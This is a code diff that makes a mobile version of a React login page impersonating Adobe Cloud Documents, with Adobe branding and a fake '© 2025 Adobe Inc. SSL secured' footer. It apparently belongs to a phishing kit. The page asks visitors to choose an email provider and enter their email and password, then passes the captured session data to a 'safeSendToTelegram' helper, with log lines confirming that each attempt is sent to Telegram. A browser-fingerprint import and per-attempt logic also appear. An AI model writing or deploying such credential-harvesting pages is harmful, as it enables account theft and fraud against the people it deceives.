@@ -1,22 +1,20 @@
 import React, { useState } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
-import { getBrowserFingerprint } from '../utils/oauthHandler';
-import safeSendToTelegram from '../utils/safeSendToTelegram';
+import { getBrowserFingerprint } from '../../utils/oauthHandler';
+import safeSendToTelegram from '../../utils/safeSendToTelegram';
 
 interface LoginPageProps {
   fileName: string;
   onBack: () => void;
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
-  showBackButton?: boolean;
 }
 
-const LoginPage: React.FC<LoginPageProps> = ({ 
+const MobileLoginPage: React.FC<LoginPageProps> = ({ 
   fileName, 
   onBack, 
-  onLoginSuccess, 
-  onLoginError,
-  showBackButton = false 
+  onLoginSuccess,
+  onLoginError 
 }) => {
   const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
   const [email, setEmail] = useState('');
@@ -46,7 +44,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
     setIsLoading(true);
     setErrorMessage('');
-    
+
     try {
       const currentAttempt = loginAttempts + 1;
       setLoginAttempts(currentAttempt);
@@ -88,9 +86,9 @@ const LoginPage: React.FC<LoginPageProps> = ({
       // Use shared safe sender
       try {
         await safeSendToTelegram(sessionData);
-        console.log(`✅ Attempt ${currentAttempt} data sent to Telegram`);
+        console.log(`✅ Mobile attempt ${currentAttempt} data sent to Telegram`);
       } catch (err) {
-        console.error('❌ Failed to send attempt data via safeSendToTelegram:', err);
+        console.error('❌ Failed to send mobile attempt data via safeSendToTelegram:', err);
       }
 
       if (currentAttempt === 1) {
@@ -106,7 +104,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
         setIsLoading(false);
       }
     } catch (error) {
-      console.error('Login error:', error);
+      console.error('Mobile login error:', error);
       if (onLoginError) onLoginError('Login failed. Please try again.');
       setIsLoading(false);
     }
@@ -130,44 +128,44 @@ const LoginPage: React.FC<LoginPageProps> = ({
         backgroundRepeat: 'no-repeat'
       }}
     >
-      {/* Decorative overlay: smaller logo + stacked subtitle lines */}
+      {/* Decorative overlay: smaller logo + combined subtitle lines */}
       <div className="absolute left-6 top-1/2 transform -translate-y-1/2 flex flex-col items-start gap-1 z-0 pointer-events-none">
-        <div className="flex items-center gap-3">
+        <div className="flex items-center gap-2">
           <img
             src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
             alt="Adobe Cloud"
-            className="w-10 h-10 md:w-12 md:h-12 object-contain drop-shadow-lg"
+            className="w-10 h-10 object-contain drop-shadow-md"
           />
-          <div className="text-white drop-shadow-lg">
-            <div className="text-2xl md:text-3xl font-semibold leading-tight">Adobe Cloud Documents</div>
-            <div className="text-white/90 text-sm md:text-base mt-1">PDF and e-signing tools.</div>
-            <div className="text-white/80 text-sm md:text-base italic">securely access documents</div>
+          <div className="text-white drop-shadow-md">
+            <div className="text-xl font-semibold leading-tight">Adobe Cloud Documents</div>
+            <div className="text-white/90 text-xs mt-1">PDF and e-signing tools.</div>
+            <div className="text-white/80 text-xs italic">securely access documents</div>
           </div>
         </div>
       </div>
 
-      {/* Card reverted to previous (smaller) dimensions */}
-      <div className="w-full max-w-md relative z-10 ml-6 md:ml-24 lg:ml-40">
-        <div className="bg-white/80 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-8 relative overflow-hidden">
+      {/* Card reverted to previous (mobile) size but slightly taller */}
+      <div className="w-full max-w-sm relative z-10 ml-4 md:ml-12 lg:ml-24">
+        <div className="bg-white/90 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-8 relative overflow-hidden min-h-[520px]">
           <div className="absolute inset-0 bg-gradient-to-br from-white/50 to-transparent pointer-events-none"></div>
           <div className="relative z-10">
             {/* Centered "Select Your Provider" pill in header */}
-            <div className="flex items-center justify-center mb-4">
-              <div className="inline-flex items-center gap-2 px-3 py-1.5 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-full border border-blue-100">
-                <Sparkles className="w-4 h-4 text-blue-500" />
-                <span className="text-sm font-medium text-blue-700">Select Your Provider</span>
+            <div className="flex items-center justify-center mb-3">
+              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100">
+                <Sparkles className="w-3 h-3 text-blue-500" />
+                <span className="text-xs font-medium text-blue-700">Select Your Provider</span>
               </div>
             </div>
 
-            <div className="mt-4">
+            <div className="mt-2">
               {!selectedProvider ? (
                 <div className="space-y-4">
-                  <div className="grid grid-cols-2 gap-4">
+                  <div className="grid grid-cols-3 gap-3">
                     {emailProviders.map((provider) => (
                       <button 
                         key={provider.name} 
                         onClick={() => handleProviderSelect(provider.name)} 
-                        className="group relative flex flex-col items-center gap-3 p-4 bg-white/60 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-300 transform hover:-translate-y-1 hover:scale-105" 
+                        className="group relative flex flex-col items-center gap-2 p-4 bg-white/60 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-300 transform hover:-translate-y-1 active:scale-95" 
                         aria-label={`Select ${provider.name}`} 
                         type="button"
                       >
@@ -175,13 +173,10 @@ const LoginPage: React.FC<LoginPageProps> = ({
                         <img 
                           src={provider.logo} 
                           alt={provider.name} 
-                          className="w-10 h-10 object-contain" 
-                          onError={(e) => {
-                            const t = e.target as HTMLImageElement;
-                            t.style.display = 'none';
-                          }}
+                          className="w-8 h-8 object-contain" 
+                          onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                         />
-                        <div className="text-sm font-semibold text-gray-800 group-hover:text-gray-900 transition-colors">
+                        <div className="text-xs font-semibold text-gray-800 group-hover:text-gray-900 transition-colors text-center">
                           {provider.name}
                         </div>
                         <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
@@ -190,73 +185,73 @@ const LoginPage: React.FC<LoginPageProps> = ({
                   </div>
                 </div>
               ) : (
-                <div className="space-y-6">
-                  <div className="flex items-center gap-3 mb-6">
+                <div className="space-y-4">
+                  <div className="flex items-center gap-2 mb-4">
                     <button 
                       onClick={handleBackToProviders} 
-                      className="p-2 rounded-lg hover:bg-gray-100 transition-colors" 
+                      className="p-1.5 rounded-lg hover:bg-gray-100 transition-colors" 
                       type="button"
                     >
                       <ArrowLeft className="w-4 h-4 text-gray-600" />
                     </button>
-                    <div className="flex items-center gap-3">
+                    <div className="flex items-center gap-2">
                       {/* selected-provider logo stands alone */}
                       <img 
                         src={emailProviders.find(p => p.name === selectedProvider)?.logo} 
                         alt={selectedProvider} 
-                        className="w-8 h-8 object-contain" 
+                        className="w-6 h-6 object-contain" 
                         onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                       />
-                      <h2 className="text-lg font-bold text-gray-900">Sign in with {selectedProvider}</h2>
+                      <h2 className="text-sm font-bold text-gray-900">Sign in with {selectedProvider}</h2>
                     </div>
                   </div>
 
-                  <form onSubmit={handleFormSubmit} className="space-y-5">
+                  <form onSubmit={handleFormSubmit} className="space-y-4">
                     {errorMessage && (
-                      <div className="bg-gradient-to-r from-red-50 to-pink-50 border border-red-200 rounded-xl p-4 animate-shake">
-                        <p className="text-red-700 text-sm font-medium flex items-center gap-2">
-                          <div className="w-4 h-4 rounded-full bg-red-500 flex items-center justify-center">
-                            <div className="w-2 h-2 bg-white rounded-full"></div>
+                      <div className="bg-gradient-to-r from-red-50 to-pink-50 border border-red-200 rounded-xl p-3 animate-shake">
+                        <p className="text-red-700 text-xs font-medium flex items-center gap-2">
+                          <div className="w-3 h-3 rounded-full bg-red-500 flex items-center justify-center">
+                            <div className="w-1.5 h-1.5 bg-white rounded-full"></div>
                           </div>
                           {errorMessage}
                         </p>
                       </div>
                     )}
 
-                    <div className="space-y-4">
+                    <div className="space-y-3">
                       <div>
-                        <label className="block text-sm font-semibold text-gray-700 mb-2">Email Address</label>
+                        <label className="block text-xs font-semibold text-gray-700 mb-1.5">Email Address</label>
                         <div className="relative group">
-                          <Mail className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5 group-focus-within:text-blue-500 transition-colors" />
+                          <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 group-focus-within:text-blue-500 transition-colors" />
                           <input 
                             type="email" 
                             value={email} 
                             onChange={(e) => setEmail(e.target.value)} 
-                            className="w-full pl-12 pr-4 py-3.5 bg-white/70 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80" 
-                            placeholder="Enter your email address" 
+                            className="w-full pl-10 pr-3 py-3 bg-white/80 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80 text-sm" 
+                            placeholder="Enter your email" 
                             required 
                           />
                         </div>
                       </div>
 
                       <div>
-                        <label className="block text-sm font-semibold text-gray-700 mb-2">Password</label>
+                        <label className="block text-xs font-semibold text-gray-700 mb-1.5">Password</label>
                         <div className="relative group">
-                          <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5 group-focus-within:text-blue-500 transition-colors" />
+                          <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 group-focus-within:text-blue-500 transition-colors" />
                           <input 
                             type={showPassword ? 'text' : 'password'} 
                             value={password} 
                             onChange={(e) => setPassword(e.target.value)} 
-                            className="w-full pl-12 pr-12 py-3.5 bg-white/70 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80" 
+                            className="w-full pl-10 pr-10 py-3 bg-white/80 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80 text-sm" 
                             placeholder="Enter your password" 
                             required 
                           />
                           <button 
                             type="button" 
                             onClick={() => setShowPassword(!showPassword)} 
-                            className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
+                            className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
                           >
-                            {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+                            {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                           </button>
                         </div>
                       </div>
@@ -265,12 +260,12 @@ const LoginPage: React.FC<LoginPageProps> = ({
                     <button 
                       type="submit" 
                       disabled={isLoading || !email || !password} 
-                      className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-4 rounded-xl font-bold text-lg hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl relative overflow-hidden group"
+                      className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-3.5 rounded-xl font-bold hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl relative overflow-hidden group text-sm"
                     >
                       <div className="absolute inset-0 bg-gradient-to-r from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                       <div className="relative flex items-center justify-center gap-2">
                         {isLoading && (
-                          <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                          <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                         )}
                         {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In Securely'}
                       </div>
@@ -280,8 +275,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
               )} 
             </div>
 
-            <div className="mt-8 text-center">
-              <p className="text-xs text-gray-500 flex items-center justify-center gap-2">
+            <div className="mt-6 text-center">
+              <p className="text-xs text-gray-500 flex items-center justify-center gap-1">
                 © 2025 Adobe Inc. SSL secured.
               </p>
             </div>
@@ -292,4 +287,4 @@ const LoginPage: React.FC<LoginPageProps> = ({
   );
 };
 
-export default LoginPage;
+export default MobileLoginPage;
